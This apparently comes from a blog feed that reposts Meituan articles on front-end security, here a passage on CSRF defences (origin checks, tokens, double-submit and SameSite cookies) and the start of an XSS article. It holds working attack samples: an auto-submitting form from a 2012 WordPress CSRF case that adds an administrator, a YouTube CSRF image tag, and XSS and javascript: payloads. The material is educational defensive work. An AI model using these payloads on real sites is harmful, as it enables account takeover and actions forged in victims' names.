href="http://test.com/csrf/withdraw.php?amount=1000&amp;for=hacker" taget="_blank"&gt;重磅消息！！&lt;a/&gt; 由于之前用户登录了信任的网站A，并且保存登录状态，只要用户主动访问上面的这个PHP页面，则表示攻击成功。 CSRF的特点 攻击一般发起在第三方网站，而不是被攻击的网站。被攻击的网站无法防止攻击发生。 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据。 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”。 跨站请求可以用各种方式：图片URL、超链接、CORS、Form提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪。 CSRF通常是跨域的，因为外域通常更容易被攻击者掌控。但是如果本域下有容易被利用的功能，比如可以发图和链接的论坛和评论区，攻击可以直接在本域下进行，而且这种攻击更加危险。 防护策略CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。 上文中讲了CSRF的两个特点： CSRF（通常）发生在第三方域名。 CSRF攻击者不能获取到Cookie等信息，只是使用。 针对这两点，我们可以专门制定防护策略，如下： 阻止不明外域的访问 同源检测 Samesite Cookie 提交时要求附加本域才能获取的信息 CSRF Token 双重Cookie验证 以下我们对各种防护方法做详细说明。 同源检测既然CSRF大多来自第三方网站，那么我们就直接禁止外域（或者不受信任的域名）对我们发起请求。 那么问题来了，我们如何判断请求是否来自外域呢？ 在HTTP协议中，每一个异步请求都会携带两个Header，用于标记来源域名： Origin Header Referer Header 这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。 服务器可以通过解析这两个Header中的域名，确定请求的来源域。 使用Origin Header确定来源域名在部分与CSRF有关的请求中，请求的Header中会携带Origin字段。字段内包含请求的域名（不包含path及query）。 如果Origin存在，那么直接使用Origin中的字段确认来源域名就可以。 但是Origin在以下两种情况下并不存在： IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考MDN Same-origin_policy#IE_Exceptions 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。 使用Referer Header确定来源域名根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。 对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。 这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。 2014年，W3C的Web应用安全工作组发布了Referrer Policy草案，对浏览器该如何发送Referer做了详细的规定。截止现在新版浏览器大部分已经支持了这份草案，我们终于可以灵活地控制自己网站的Referer策略了。新版的Referrer Policy规定了五种Referer策略：No Referrer、No Referrer When Downgrade、Origin Only、Origin When Cross-origin、和 Unsafe URL。之前就存在的三种策略：never、default和always，在新标准里换了个名称。他们的对应关系如下： 策略名称 属性值（新） 属性值（旧） No Referrer no-Referrer never No Referrer When Downgrade no-Referrer-when-downgrade default Origin Only (same or strict) origin origin Origin When Cross Origin (strict) origin-when-crossorigin - Unsafe URL unsafe-url always 根据上面的表格因此需要把Referrer Policy的策略设置成same-origin，对于同源的链接和引用，会发送Referer，referer值为Host不带Path；跨域访问则不携带Referer。例如：aaa.com引用bbb.com的资源，不会发送Referer。 设置Referrer Policy的方法有三种： 在CSP设置 页面头部增加meta标签 a标签增加referrerpolicy属性 上面说的这些比较多，但我们可以知道一个问题：攻击者可以在自己的请求中隐藏Referer。如果攻击者将自己的请求这样填写： 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) 那么这个请求发起的攻击将不携带Referer。 另外在以下情况下Referer没有或者不可信： IE6、7下使用window.location.href=url进行界面的跳转，会丢失Referer。 IE6、7下使用window.open，也会缺失Referer。 HTTPS页面跳转到HTTP页面，所有浏览器Referer都丢失。 点击Flash上到达另外一个网站的时候，Referer的情况就比较杂乱，不太可信。 无法确认来源域名情况当Origin和Referer头文件不存在时该怎么办？如果Origin和Referer都不存在，建议直接进行阻止，特别是如果您没有使用随机CSRF Token（参考下方）作为第二次检查。 如何阻止外域请求通过Header的验证，我们可以知道发起请求的来源域名，这些来源域名可能是网站本域，或者子域名，或者有授权的第三方域名，又或者来自不可信的未知域名。 我们已经知道了请求域名是否是来自不可信的域名，我们直接阻止掉这些的请求，就能防御CSRF攻击了吗？ 且慢！当一个请求是页面请求（比如网站的主页），而来源是搜索引擎的链接（例如百度的搜索结果），也会被当成疑似CSRF攻击。所以在判断的时候需要过滤掉页面请求情况，通常Header符合以下情况： 12Accept: text/htmlMethod: GET 但相应的，页面请求就暴露在了CSRF的攻击范围之中。如果你的网站中，在页面的GET请求中对当前用户做了什么操作的话，防范就失效了。 例如，下面的页面请求： 1GET https://example.com/addComment?comment=XXX&amp;dest=orderId 注：这种严格来说并不一定存在CSRF攻击的风险，但仍然有很多网站经常把主文档GET请求挂上参数来实现产品功能，但是这样做对于自身来说是存在安全风险的。 另外，前面说过，CSRF大多数情况下来自第三方域名，但并不能排除本域发起。如果攻击者有权限在本域发布评论（含链接、图片等，统称UGC），那么它可以直接在本域发起攻击，这种情况下同源策略无法达到防护的作用。 综上所述：同源验证是一个相对简单的防范方法，能够防范绝大多数的CSRF攻击。但这并不是万无一失的，对于安全性要求较高，或者有较多用户输入内容的网站，我们就要对关键的接口做额外的防护措施。 CSRF Token前面讲到CSRF的另一个特征是，攻击者无法直接窃取到用户的信息（Cookie，Header，网站内容等），仅仅是冒用Cookie中的信息。 而CSRF攻击之所以能够成功，是因为服务器误把攻击者发送的请求当成了用户自己的请求。那么我们可以要求所有的用户请求都携带一个CSRF攻击者无法获取到的Token。服务器通过校验请求是否携带正确的Token，来把正常的请求和攻击的请求区分开，也可以防范CSRF的攻击。 原理CSRF Token的防护策略分为三个步骤： 1. 将CSRF Token输出到页面中 首先，用户打开页面的时候，服务器需要给这个用户生成一个Token，该Token通过加密算法对数据进行加密，一般Token都包括随机字符串和时间戳的组合，显然在提交时Token不能再放在Cookie中了，否则又会被攻击者冒用。因此，为了安全起见Token最好还是存在服务器的Session中，之后在每次页面加载时，使用JS遍历整个DOM树，对于DOM中所有的a和form标签后加入Token。这样可以解决大部分的请求，但是对于在页面加载之后动态生成的HTML代码，这种方法就没有作用，还需要程序员在编码时手动添加Token。 2. 页面提交的请求携带这个Token 对于GET请求，Token将附在请求地址之后，这样URL 就变成 http://url?csrftoken=tokenvalue。 而对于 POST 请求来说，要在 form 的最后加上： 1&lt;input type=”hidden” name=”csrftoken” value=”tokenvalue”/&gt; 这样，就把Token以参数的形式加入请求了。 3. 服务器验证Token是否正确 当用户从客户端得到了Token，再次提交给服务器的时候，服务器需要判断Token的有效性，验证过程是先解密Token，对比加密字符串以及时间戳，如果加密字符串一致且时间未过期，那么这个Token就是有效的。 这种方法要比之前检查Referer或者Origin要安全一些，Token可以在产生并放于Session之中，然后在每次请求时把Token从Session中拿出，与请求中的Token进行比对，但这种方法的比较麻烦的在于如何把Token以参数的形式加入请求。 下面将以Java为例，介绍一些CSRF Token的服务端校验逻辑，代码如下： 1234567891011121314151617181920212223HttpServletRequest req = (HttpServletRequest)request; HttpSession s = req.getSession(); // 从 session 中得到 csrftoken 属性String sToken = (String)s.getAttribute(“csrftoken”); if(sToken == null)&#123; // 产生新的 token 放入 session 中 sToken = generateToken(); s.setAttribute(“csrftoken”,sToken); chain.doFilter(request, response); &#125; else&#123; // 从 HTTP 头中取得 csrftoken String xhrToken = req.getHeader(“csrftoken”); // 从请求参数中取得 csrftoken String pToken = req.getParameter(“csrftoken”); if(sToken != null &amp;&amp; xhrToken != null &amp;&amp; sToken.equals(xhrToken))&#123; chain.doFilter(request, response); &#125;else if(sToken != null &amp;&amp; pToken != null &amp;&amp; sToken.equals(pToken))&#123; chain.doFilter(request, response); &#125;else&#123; request.getRequestDispatcher(“error.jsp”).forward(request,response); &#125; &#125; 代码源自IBM developerworks CSRF 这个Token的值必须是随机生成的，这样它就不会被攻击者猜到，考虑利用Java应用程序的java.security.SecureRandom类来生成足够长的随机标记，替代生成算法包括使用256位BASE64编码哈希，选择这种生成算法的开发人员必须确保在散列数据中使用随机性和唯一性来生成随机标识。通常，开发人员只需为当前会话生成一次Token。在初始生成此Token之后，该值将存储在会话中，并用于每个后续请求，直到会话过期。当最终用户发出请求时，服务器端必须验证请求中Token的存在性和有效性，与会话中找到的Token相比较。如果在请求中找不到Token，或者提供的值与会话中的值不匹配，则应中止请求，应重置Token并将事件记录为正在进行的潜在CSRF攻击。 分布式校验在大型网站中，使用Session存储CSRF Token会带来很大的压力。访问单台服务器session是同一个。但是现在的大型网站中，我们的服务器通常不止一台，可能是几十台甚至几百台之多，甚至多个机房都可能在不同的省份，用户发起的HTTP请求通常要经过像Ngnix之类的负载均衡器之后，再路由到具体的服务器上，由于Session默认存储在单机服务器内存中，因此在分布式环境下同一个用户发送的多次HTTP请求可能会先后落到不同的服务器上，导致后面发起的HTTP请求无法拿到之前的HTTP请求存储在服务器中的Session数据，从而使得Session机制在分布式环境下失效，因此在分布式集群中CSRF Token需要存储在Redis之类的公共存储空间。 由于使用Session存储，读取和验证CSRF Token会引起比较大的复杂度和性能问题，目前很多网站采用Encrypted Token Pattern方式。这种方法的Token是一个计算出来的结果，而非随机生成的字符串。这样在校验时无需再去读取存储的Token，只用再次计算一次即可。 这种Token的值通常是使用UserID、时间戳和随机数，通过加密的方法生成。这样既可以保证分布式服务的Token一致，又能保证Token不容易被破解。 在token解密成功之后，服务器可以访问解析值，Token中包含的UserID和时间戳将会被拿来被验证有效性，将UserID与当前登录的UserID进行比较，并将时间戳与当前时间进行比较。 总结Token是一个比较有效的CSRF防护方法，只要页面没有XSS漏洞泄露Token，那么接口的CSRF攻击就无法成功。 但是此方法的实现比较复杂，需要给每一个页面都写入Token（前端无法使用纯静态页面），每一个Form及Ajax请求都携带这个Token，后端对每一个接口都进行校验，并保证页面Token及请求Token一致。这就使得这个防护策略不能在通用的拦截上统一拦截处理，而需要每一个页面和接口都添加对应的输出和校验。这种方法工作量巨大，且有可能遗漏。 验证码和密码其实也可以起到CSRF Token的作用哦，而且更安全。 为什么很多银行等网站会要求已经登录的用户在转账时再次输入密码，现在是不是有一定道理了？ 双重Cookie验证在会话中存储CSRF Token比较繁琐，而且不能在通用的拦截上统一处理所有的接口。 那么另一种防御措施是使用双重提交Cookie。利用CSRF攻击不能获取到用户Cookie的特点，我们可以要求Ajax和表单请求携带一个Cookie中的值。 双重Cookie采用以下流程： 在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）。 在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）。 后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。 此方法相对于CSRF Token就简单了许多。可以直接通过前后端拦截的的方法自动化实现。后端校验也更加方便，只需进行请求中字段的对比，而不需要再进行查询和存储Token。 当然，此方法并没有大规模应用，其在大型网站上的安全性还是没有CSRF Token高，原因我们举例进行说明。 由于任何跨域都会导致前端无法获取Cookie中的字段（包括子域名之间），于是发生了如下情况： 如果用户访问的网站为www.a.com，而后端的api域名为api.a.com。那么在www.a.com下，前端拿不到api.a.com的Cookie，也就无法完成双重Cookie认证。 于是这个认证Cookie必须被种在a.com下，这样每个子域都可以访问。 任何一个子域都可以修改a.com下的Cookie。 某个子域名存在漏洞被XSS攻击（例如upload.a.com）。虽然这个子域下并没有什么值得窃取的信息。但攻击者修改了a.com下的Cookie。 攻击者可以直接使用自己配置的Cookie，对XSS中招的用户再向www.a.com下，发起CSRF攻击。 总结：用双重Cookie防御CSRF的优点： 无需使用Session，适用面更广，易于实施。 Token储存于客户端中，不会给服务器带来压力。 相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。 缺点： Cookie中增加了额外的字段。 如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。 难以做到子域名的隔离。 为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。 Samesite Cookie属性防止CSRF攻击的办法已经有上面的预防措施。为了从源头上解决这个问题，Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性，它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie，Samesite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： Samesite=Strict这种称为严格模式，表明这个 Cookie 在任何情况下都不可能作为第三方 Cookie，绝无例外。比如说 b.com 设置了如下 Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 我们在 a.com 下发起对 b.com 的任意请求，foo 这个 Cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 Cookie 被设置成了 Samesite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 Cookie，其它网站发起的对淘宝的任意请求都不会带上那个 Cookie。 Samesite=Lax这种称为宽松模式，比 Strict 放宽了点限制：假如这个请求是这种请求（改变了当前页面或者打开了新页面）且同时是个GET请求，则这个Cookie可以作为第三方Cookie。比如说 b.com设置了如下Cookie： 123Set-Cookie: foo=1; Samesite=StrictSet-Cookie: bar=2; Samesite=LaxSet-Cookie: baz=3 当用户从 a.com 点击链接进入 b.com 时，foo 这个 Cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则bar也不会发送。 生成Token放到Cookie中并且设置Cookie的Samesite，Java代码如下： 123456789private void addTokenCookieAndHeader(HttpServletRequest httpRequest, HttpServletResponse httpResponse) &#123; //生成token String sToken = this.generateToken(); //手动添加Cookie实现支持“Samesite=strict” //Cookie添加双重验证 String CookieSpec = String.format("%s=%s; Path=%s; HttpOnly; Samesite=Strict", this.determineCookieName(httpRequest), sToken, httpRequest.getRequestURI()); httpResponse.addHeader("Set-Cookie", CookieSpec); httpResponse.setHeader(CSRF_TOKEN_NAME, token); &#125; 代码源自OWASP Cross-Site_Request_Forgery #Implementation example 我们应该如何使用SamesiteCookie如果SamesiteCookie被设置为Strict，浏览器在任何跨域请求中都不会携带Cookie，新标签重新打开也不携带，所以说CSRF攻击基本没有机会。 但是跳转子域名或者是新标签重新打开刚登陆的网站，之前的Cookie都不会存在。尤其是有登录的网站，那么我们新打开一个标签进入，或者跳转到子域名的网站，都需要重新登录。对于用户来讲，可能体验不会很好。 如果SamesiteCookie被设置为Lax，那么其他网站通过页面跳转过来的时候可以使用Cookie，可以保障外域连接打开页面时用户的登录状态。但相应的，其安全性也比较低。 另外一个问题是Samesite的兼容性不是很好，现阶段除了从新版Chrome和Firefox支持以外，Safari以及iOS Safari都还不支持，现阶段看来暂时还不能普及。 而且，SamesiteCookie目前有一个致命的缺陷：不支持子域。例如，种在topic.a.com下的Cookie，并不能使用a.com下种植的SamesiteCookie。这就导致了当我们网站有多个子域名时，不能使用SamesiteCookie在主域名存储用户登录信息。每个子域名都需要用户重新登录一次。 总之，SamesiteCookie是一个可能替代同源验证的方案，但目前还并不成熟，其应用场景有待观望。 防止网站被利用前面所说的，都是被攻击的网站如何做好防护。而非防止攻击的发生，CSRF的攻击可以来自： 攻击者自己的网站。 有文件上传漏洞的网站。 第三方论坛等用户内容。 被攻击网站自己的评论功能等。 对于来自黑客自己的网站，我们无法防护。但对其他情况，那么如何防止自己的网站被利用成为攻击的源头呢？ 严格管理所有的上传接口，防止任何预期之外的上传内容（例如HTML）。 添加Header X-Content-Type-Options: nosniff 防止黑客上传HTML内容的资源（例如图片）被解析为网页。 对于用户上传的图片，进行转存或者校验。不要直接使用用户填写的图片链接。 当前用户打开其他用户填写的链接时，需告知风险（这也是很多论坛不允许直接在内容中发布外域链接的原因之一，不仅仅是为了用户留存，也有安全考虑）。 CSRF其他防范措施对于一线的程序员同学，我们可以通过各种防护策略来防御CSRF，对于QA、SRE、安全负责人等同学，我们可以做哪些事情来提升安全性呢？ CSRF测试CSRFTester是一款CSRF漏洞的测试工具，CSRFTester工具的测试原理大概是这样的，使用代理抓取我们在浏览器中访问过的所有的连接以及所有的表单等信息，通过在CSRFTester中修改相应的表单等信息，重新提交，相当于一次伪造客户端请求，如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。 CSRFTester使用方法大致分下面几个步骤： 步骤1：设置浏览器代理 CSRFTester默认使用Localhost上的端口8008作为其代理，如果代理配置成功，CSRFTester将为您的浏览器生成的所有后续HTTP请求生成调试消息。 步骤2：使用合法账户访问网站开始测试 我们需要找到一个我们想要为CSRF测试的特定业务Web页面。找到此页面后，选择CSRFTester中的“开始录制”按钮并执行业务功能；完成后，点击CSRFTester中的“停止录制”按钮；正常情况下，该软件会全部遍历一遍当前页面的所有请求。 步骤3：通过CSRF修改并伪造请求 之后，我们会发现软件上有一系列跑出来的记录请求，这些都是我们的浏览器在执行业务功能时生成的所有GET或者POST请求。通过选择列表中的某一行，我们现在可以修改用于执行业务功能的参数，可以通过点击对应的请求修改query和form的参数。当修改完所有我们希望诱导用户form最终的提交值，可以选择开始生成HTML报告。 步骤4：拿到结果如有漏洞进行修复 首先必须选择“报告类型”。报告类型决定了我们希望受害者浏览器如何提交先前记录的请求。目前有5种可能的报告：表单、iFrame、IMG、XHR和链接。一旦选择了报告类型，我们可以选择在浏览器中启动新生成的报告，最后根据报告的情况进行对应的排查和修复。 CSRF监控对于一个比较复杂的网站系统，某些项目、页面、接口漏掉了CSRF防护措施是很可能的。 一旦发生了CSRF攻击，我们如何及时的发现这些攻击呢？ CSRF攻击有着比较明显的特征： 跨域请求。 GET类型请求Header的MIME类型大概率为图片，而实际返回Header的MIME类型为Text、JSON、HTML。 我们可以在网站的代理层监控所有的接口请求，如果请求符合上面的特征，就可以认为请求有CSRF攻击嫌疑。我们可以提醒对应的页面和项目负责人，检查或者 Review其CSRF防护策略。 个人用户CSRF安全的建议经常上网的个人用户，可以采用以下方法来保护自己： 使用网页版邮件的浏览邮件或者新闻也会带来额外的风险，因为查看邮件或者新闻消息有可能导致恶意代码的攻击。 尽量不要打开可疑的链接，一定要打开时，使用不常用的浏览器。 总结简单总结一下上文的防护策略： CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。 CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。 保证页面的幂等性，后端接口不要在GET页面中做用户操作。 为了更好的防御CSRF，最佳实践应该是结合上面总结的防御措施方式中的优缺点来综合考虑，结合当前Web应用程序自身的情况做合适的选择，才能更好的预防CSRF的发生。 历史案例WordPress的CSRF漏洞2012年3月份，WordPress发现了一个CSRF漏洞，影响了WordPress 3.3.1版本，WordPress是众所周知的博客平台，该漏洞可以允许攻击者修改某个Post的标题，添加管理权限用户以及操作用户账户，包括但不限于删除评论、修改头像等等。具体的列表如下: Add Admin/User Delete Admin/User Approve comment Unapprove comment Delete comment Change background image Insert custom header image Change site title Change administrator’s email Change Wordpress Address Change Site Address 那么这个漏洞实际上就是攻击者引导用户先进入目标的WordPress，然后点击其钓鱼站点上的某个按钮，该按钮实际上是表单提交按钮，其会触发表单的提交工作，添加某个具有管理员权限的用户，实现的码如下： 12345678910111213141516171819&lt;html&gt; &lt;body onload="javascript:document.forms[0].submit()"&gt; &lt;H2&gt;CSRF Exploit to add Administrator&lt;/H2&gt; &lt;form method="POST" name="form0" action="http://&lt;wordpress_ip&gt;:80/wp-admin/user-new.php"&gt; &lt;input type="hidden" name="action" value="createuser"/&gt; &lt;input type="hidden" name="_wpnonce_create-user" value="&lt;sniffed_value&gt;"/&gt; &lt;input type="hidden" name="_wp_http_referer" value="%2Fwordpress%2Fwp-admin%2Fuser-new.php"/&gt; &lt;input type="hidden" name="user_login" value="admin2"/&gt; &lt;input type="hidden" name="email" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="first_name" value="admin2@admin.com"/&gt; &lt;input type="hidden" name="last_name" value=""/&gt; &lt;input type="hidden" name="url" value=""/&gt; &lt;input type="hidden" name="pass1" value="password"/&gt; &lt;input type="hidden" name="pass2" value="password"/&gt; &lt;input type="hidden" name="role" value="administrator"/&gt; &lt;input type="hidden" name="createuser" value="Add+New+User+"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; YouTube的CSRF漏洞2008年，有安全研究人员发现，YouTube上几乎所有用户可以操作的动作都存在CSRF漏洞。如果攻击者已经将视频添加到用户的“Favorites”，那么他就能将他自己添加到用户的“Friend”或者“Family”列表，以用户的身份发送任意的消息，将视频标记为不宜的，自动通过用户的联系人来共享一个视频。例如，要把视频添加到用户的“Favorites”，攻击者只需在任何站点上嵌入如下所示的IMG标签： 12&lt;img src="http://youtube.com/watch_ajax?action_add_favorite_playlist=1&amp;video_id=[VIDEO ID]&amp;playlist_id=&amp;add_to_favorite=1&amp;show=1&amp;button=AddvideoasFavorite"/&gt; 攻击者也许已经利用了该漏洞来提高视频的流行度。例如，将一个视频添加到足够多用户的“Favorites”，YouTube就会把该视频作为“Top Favorites”来显示。除提高一个视频的流行度之外，攻击者还可以导致用户在毫不知情的情况下将一个视频标记为“不宜的”，从而导致YouTube删除该视频。 这些攻击还可能已被用于侵犯用户隐私。YouTube允许用户只让朋友或亲属观看某些视频。这些攻击会导致攻击者将其添加为一个用户的“Friend”或“Family”列表，这样他们就能够访问所有原本只限于好友和亲属表中的用户观看的私人的视频。 攻击者还可以通过用户的所有联系人名单（“Friends”、“Family”等等）来共享一个视频，“共享”就意味着发送一个视频的链接给他们，当然还可以选择附加消息。这条消息中的链接已经并不是真正意义上的视频链接，而是一个具有攻击性的网站链接，用户很有可能会点击这个链接，这便使得该种攻击能够进行病毒式的传播。 参考文献 Mozilla wiki.Security-Origin OWASP.Cross-Site_RequestForgery(CSRF)_Prevention_Cheat_Sheet. Gmail Security Hijack Case.Google-Gmail-Security-Hijack. Netsparker Blog.Same-Site-Cookie-Attribute-Prevent-Cross-site-Request-Forgery MDN.Same-origin_policy#IE_Exceptions]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端安全系列（一）：如何防止XSS攻击？]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2XSS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[转载自美团技术团队，作者李阳，原文链接：https://tech.meituan.com/2018/09/27/fe-security.html 前端安全随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端人员在日常开发中不断预防和修复安全漏洞。本文是该系列的第一篇。 本文我们会讲解 XSS ，主要包括： XSS 攻击的介绍 XSS 攻击的分类 XSS 攻击的预防和检测 XSS 攻击的总结 XSS 攻击案例 XSS 攻击的介绍在开始本文之前，我们先提出一个问题，请判断以下两个说法是否正确： XSS 防范是后端 RD（研发人员）的责任，后端 RD 应该在所有用户提交数据的接口，对敏感字符进行转义，才能进行下一步操作。 所有要插入到页面上的数据，都要通过一个敏感字符过滤函数的转义，过滤掉通用的敏感字符后，就可以插入到页面中。 如果你还不能确定答案，那么可以带着这些问题向下看，我们将逐步拆解问题。 XSS 漏洞的发生和修复XSS 攻击是页面被注入了恶意的代码，为了更形象的介绍，我们用发生在小明同学身边的事例来进行说明。 一个案例某天，公司需要一个搜索页面，根据 URL 参数决定关键词的内容。小明很快把页面写好并且上线。代码如下： 12345&lt;input type="text" value="&lt;%= getParameter("keyword") %&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&lt;%= getParameter("keyword") %&gt;&lt;/div&gt; 然而，在上线后不久，小明就接到了安全组发来的一个神秘链接： 1http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&apos;XSS&apos;);&lt;/script&gt; 小明带着一种不祥的预感点开了这个链接[请勿模仿，确认安全的链接才能点开]。果然，页面中弹出了写着”XSS”的对话框。 可恶，中招了！小明眉头一皱，发现了其中的奥秘： 当浏览器请求 http://xxx/search?keyword=&quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; 时，服务端会解析出请求参数 keyword，得到 &quot;&gt;&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt;，拼接到 HTML 中返回给浏览器。形成了如下的 HTML： 123456789&lt;input type="text" value="" /&gt;&lt;script&gt; alert('XSS');&lt;/script&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是："&gt;&lt;script&gt; alert('XSS'); &lt;/script&gt;&lt;/div&gt; 浏览器无法分辨出 &lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; 是恶意代码，因而将其执行。 这里不仅仅 div 的内容被注入了，而且 input 的 value 属性也被注入， alert 会弹出两次。 面对这种情况，我们应该如何进行防范呢？ 其实，这只是浏览器把用户的输入当成了脚本进行了执行。那么只要告诉浏览器这段内容是文本就可以了。 聪明的小明很快找到解决方法，把这个漏洞修复： 12345&lt;input type="text" value="&lt;%= escapeHTML(getParameter("keyword")) %&gt;"&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&lt;%= escapeHTML(getParameter("keyword")) %&gt;&lt;/div&gt; escapeHTML() 按照如下规则进行转义： |字符|转义后的字符| |-|-| |&amp;|&amp;amp;| |&lt;|&amp;lt;| |&gt;|&amp;gt;| |&quot;|&amp;quot;| |&#39;|&amp;#x27;| |/|&amp;#x2F;| 经过了转义函数的处理后，最终浏览器接收到的响应为： 12345678&lt;input type="text" value='"&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;'/&gt;&lt;button&gt;搜索&lt;/button&gt;&lt;div&gt; 您搜索的关键词是：&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&amp;#x27;XSS&amp;#x27;);&amp;lt;&amp;#x2F;script&amp;gt;&lt;/div&gt; 恶意代码都被转义，不再被浏览器执行，而且搜索词能够完美的在页面显示出来。 通过这个事件，小明学习到了如下知识： 通常页面中包含的用户输入内容都在固定的容器或者属性内，以文本的形式展示。 攻击者利用这些页面的用户输入片段，拼接特殊格式的字符串，突破原有位置的限制，形成了代码片段。 攻击者通过在目标网站上注入脚本，使之在用户的浏览器上运行，从而引发潜在风险。 通过 HTML 转义，可以防止 XSS 攻击。[事情当然没有这么简单啦！请继续往下看]。 注意特殊的 HTML 属性、JavaScript API自从上次事件之后，小明会小心的把插入到页面中的数据进行转义。而且他还发现了大部分模板都带有的转义配置，让所有插入到页面中的数据都默认进行转义。这样就不怕不小心漏掉未转义的变量啦，于是小明的工作又渐渐变得轻松起来。 但是，作为导演的我，不可能让小明这么简单、开心地改 Bug 。 不久，小明又收到安全组的神秘链接：http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)。小明不敢大意，赶忙点开页面。然而，页面并没有自动弹出万恶的“XSS”。 小明打开对应页面的源码，发现有以下内容： 1&lt;a href="&lt;%= escapeHTML(getParameter("redirect_to")) %&gt;"&gt;跳转...&lt;/a&gt; 这段代码，当攻击 URL 为 http://xxx/?redirect_to=javascript:alert(&#39;XSS&#39;)，服务端响应就成了： 1&lt;a href="javascript:alert(&amp;#x27;XSS&amp;#x27;)"&gt;跳转...&lt;/a&gt; 虽然代码不会立即执行，但一旦用户点击 a 标签时，浏览器会就会弹出“XSS”。 可恶，又失策了… 在这里，用户的数据并没有在位置上突破我们的限制，仍然是正确的 href 属性。但其内容并不是我们所预期的类型。 原来不仅仅是特殊字符，连 javascript: 这样的字符串如果出现在特定的位置也会引发 XSS 攻击。 小明眉头一皱，想到了解决办法： 1234567891011// 禁止 URL 以 "javascript:" 开头xss = getParameter("redirect_to").startsWith('javascript:');if (!xss) &#123; &lt;a href="&lt;%= escapeHTML(getParameter("redirect_to"))%&gt;"&gt; 跳转... &lt;/a&gt;&#125; else &#123; &lt;a href="/404"&gt; 跳转... &lt;/a&gt;&#125; 只要 URL 的开头不是 javascript:，就安全了吧？ 安全组随手又扔了一个连接：http://xxx/?redirect_to=jAvascRipt:alert(&#39;XSS&#39;) 这也能执行？…..好吧，浏览器就是这么强大。 